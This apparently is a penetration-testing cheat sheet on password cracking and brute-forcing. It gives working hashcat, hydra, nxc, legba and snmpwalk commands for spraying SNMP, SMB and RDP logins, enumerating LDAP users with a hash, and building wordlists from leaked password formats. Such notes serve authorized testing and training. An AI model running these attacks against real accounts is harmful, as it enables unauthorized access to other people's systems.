# Cracking & Bruteforcing

Offline hash cracking and online service brute-forcing, by target type.

SNMPv3 is often overlooked in password-reuse sprays — if you have a leaked/breach password list and a set of usernames, spray it before assuming SNMP is a dead end:
```bash
./legba snmp3 --target <IP> --username users.txt --password passwords.txt
snmpwalk -v3 -u <user> -A '<password>' <IP> -l authNoPriv   # authNoPriv community strings/creds sometimes sit in the MIB tree itself
```

If a password policy or onboarding doc leaks the *format* of a password (e.g. a redacted example like `ProtoTr****1973!`), build a hashcat mask instead of a dictionary attack:
```bash
hashcat -O -m <mode> -a3 -1='?u?l?d' 'ProtoTr?1?1?1?11973!' --username hash.txt
```

If an onboarding/security-policy document leaks the exact *formula* for temporary passwords (e.g. "first 3 letters of first name, uppercase + year + special char + last 2 letters of surname, lowercase"), skip masks entirely and generate a real wordlist from LDAP-queried names — cheaper and exact, no guessing the mask syntax:
```bash
nxc ldap <DC_FQDN> -u <USER> -H '<HASH>' --query '(&(objectCategory=person)(objectClass=user))' 'sAMAccountName,givenName,sn'
```
```python
for username, (first, last) in names.items():          # build username:password pairs from the formula
    password = f"{first[:3].upper()}!{YEAR}{special}{last[-2:].lower()}"
```
```bash
cut -d: -f1 credentials.txt > users.txt; cut -d: -f2- credentials.txt > passwords.txt
nxc smb <DC_FQDN> -u users.txt -p passwords.txt | grep '[+]'
```

If a doc or pentest report reveals the password *pattern* (e.g. "guessable word + year") without an exact formula, use the hashcat combinator attack to build a wordlist rather than a mask — combine a base list (names, seasons) with a year list:
```bash
hashcat -a 1 --stdout base.txt year.txt > combined.txt
nxc smb <TARGET> -u users.txt -p combined.txt --continue-on-success | grep '\[+\]'
# hydra misses "valid credential but no RDP access" — pipe with -V flag or use nxc instead:
hydra -t 1 -V -f -L users.txt -P combined.txt rdp://<TARGET>
```

Cisco "type 5" (MD5-crypt) secrets show up often in router/switch config backups found on shares or in email attachments — don't skip them as uncrackable just because they look like a hash blob:
```bash
hashcat -m500 -a0 cisco_type5.hash <WORDLIST>
```
